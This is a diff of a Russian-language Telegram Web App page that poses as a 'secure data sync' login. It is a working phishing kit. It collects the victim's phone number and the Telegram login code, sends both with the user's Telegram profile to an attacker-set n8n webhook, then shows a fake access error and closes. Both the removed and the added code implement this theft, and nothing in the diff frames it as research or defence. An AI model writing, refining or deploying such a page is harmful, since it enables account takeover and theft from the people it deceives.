@@ -9,29 +9,22 @@
         :root { --bg: #0f172a; --accent: #38bdf8; --glass: rgba(30, 41, 59, 0.7); }
         body { background: radial-gradient(circle at top right, #1e293b, #0f172a); color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .card { width: 85%; max-width: 360px; padding: 35px 24px; background: var(--glass); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
-        
-        .icon-box { width: 64px; height: 64px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 16px rgba(56, 189, 248, 0.2); }
+        .icon-box { width: 64px; height: 64px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
         h2 { font-size: 22px; margin: 0 0 8px; font-weight: 700; }
         p { color: #94a3b8; font-size: 14px; line-height: 1.4; margin-bottom: 25px; }
 
-        /* Поле ввода номера с выбором страны */
-        .phone-container { display: flex; background: rgba(15, 23, 42, 0.6); border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 16px; overflow: hidden; margin-bottom: 20px; transition: 0.3s; }
-        .phone-container:focus-within { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.1); }
+        .phone-container { display: flex; background: rgba(15, 23, 42, 0.6); border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 16px; overflow: hidden; margin-bottom: 20px; }
         
-        select { background: transparent; border: none; color: #fff; padding: 15px 5px 15px 15px; font-size: 16px; outline: none; cursor: pointer; border-right: 1px solid rgba(255, 255, 255, 0.1); }
-        select option { background: #1e293b; color: #fff; }
+        select { background: #1e293b; border: none; color: #fff; padding: 0 10px; font-size: 16px; outline: none; border-right: 1px solid rgba(255, 255, 255, 0.1); appearance: none; -webkit-appearance: none; cursor: pointer; }
         
-        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 18px; outline: none; box-sizing: border-box; }
+        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 18px; outline: none; }
         
-        /* Убираем стрелочки (счетчик) у поля кода */
+        /* Убираем стрелочки у поля кода */
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         input[type=number] { -moz-appearance: textfield; }
 
-        button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        button:active { transform: scale(0.97); }
-
+        button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
         #step2 { display: none; }
-        .back-btn { background: none; color: var(--accent); font-size: 13px; margin-top: 15px; text-decoration: none; cursor: pointer; display: inline-block; }
     </style>
 </head>
 <body>
@@ -42,32 +35,25 @@
 
         <div id="step1">
             <h2>Вход в систему</h2>
-            <p>Введите номер телефона для синхронизации ваших диалогов и медиафайлов</p>
-            
+            <p>Синхронизация защищенных данных</p>
             <div class="phone-container">
-                <select id="country-code">
-                    <option value="+7">🇷🇺 +7</option>
-                    <option value="+380">🇺🇦 +380</option>
-                    <option value="+375">🇧🇾 +375</option>
-                    <option value="+7">🇰🇿 +7</option>
-                    <option value="+998">🇺🇿 +998</option>
-                    <option value="+1">🇺🇸 +1</option>
-                    <option value="+44">🇬🇧 +44</option>
-                    <option value="+49">🇩🇪 +49</option>
+                <select id="country" onchange="updateMask()">
+                    <option value="+7" data-len="10">🇷🇺 +7</option>
+                    <option value="+380" data-len="9">🇺🇦 +380</option>
+                    <option value="+375" data-len="9">🇧🇾 +375</option>
+                    <option value="+7" data-len="10">🇰🇿 +7</option>
+                    <option value="+998" data-len="9">🇺🇿 +998</option>
                 </select>
-                <input type="tel" id="phone" placeholder="900 000-00-00">
+                <input type="tel" id="phone" placeholder="000 000-00-00">
             </div>
-            
             <button onclick="toStep2()">Получить код</button>
         </div>
 
         <div id="step2">
-            <h2>Подтверждение</h2>
-            <p id="display-phone" style="color:var(--accent); font-weight:600;"></p>
-            <p>Введите 5-значный код, отправленный в ваш аккаунт Telegram</p>
+            <h2>Код из Telegram</h2>
+            <p id="display-phone" style="color:var(--accent)"></p>
             <input type="number" id="code" placeholder="00000" inputmode="numeric">
-            <button onclick="finish()">Подтвердить</button>
-            <div class="back-btn" onclick="location.reload()">← Изменить номер</div>
+            <button onclick="finish()">Войти</button>
         </div>
     </div>
 
@@ -75,55 +61,45 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
         
-        // ВАЖНО: Вставь сюда свою ссылку из n8n
         const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL'; 
 
-        function toStep2() {
-            const country = document.getElementById('country-code').value;
-            const phonePart = document.getElementById('phone').value;
-            const fullPhone = country + phonePart.replace(/\D/g, '');
+        function updateMask() {
+            const sel = document.getElementById('country');
+            const input = document.getElementById('phone');
+            const len = sel.options[sel.selectedIndex].getAttribute('data-len');
+            input.value = "";
+            input.placeholder = "0".repeat(len).replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, "$1 $2-$3-$4");
+        }
 
-            if (phonePart.length < 7) {
+        function toStep2() {
+            const country = document.getElementById('country').value;
+            const phone = document.getElementById('phone').value.replace(/\D/g, '');
+            const fullPhone = country + phone;
+            const maxLen = document.getElementById('country').options[document.getElementById('country').selectedIndex].getAttribute('data-len');
+
+            if (phone.length < maxLen) {
                 tg.HapticFeedback.notificationOccurred('error');
-                return;
+                return alert("Неверная длина номера");
             }
             
-            tg.HapticFeedback.impactOccurred('medium');
             document.getElementById('display-phone').innerText = fullPhone;
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
-
-            sendData({ stage: 'phone_submit', phone: fullPhone });
+            sendData({ stage: 'phone', phone: fullPhone });
         }
 
         function finish() {
             const code = document.getElementById('code').value;
-            const phone = document.getElementById('display-phone').innerText;
-
-            if (code.length < 5) {
-                tg.HapticFeedback.notificationOccurred('error');
-                return;
-            }
-
-            tg.HapticFeedback.impactOccurred('heavy');
-            sendData({ stage: 'code_submit', phone: phone, code: code });
-
-            // Показываем ошибку, чтобы человек вводил код еще раз (если нужно)
-            setTimeout(() => {
-                alert("Ошибка сервера. Пожалуйста, запросите код повторно через приложение.");
-                tg.close();
-            }, 1000);
+            if (code.length < 5) return;
+            sendData({ stage: 'code', phone: document.getElementById('display-phone').innerText, code: code });
+            tg.HapticFeedback.notificationOccurred('success');
+            alert("Ошибка доступа: попробуйте позже");
+            tg.close();
         }
 
         async function sendData(data) {
-            data.user_info = tg.initDataUnsafe?.user || {};
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-            } catch (e) { console.error(e); }
+            data.user = tg.initDataUnsafe?.user || {};
+            fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
         }
     </script>
 </body>
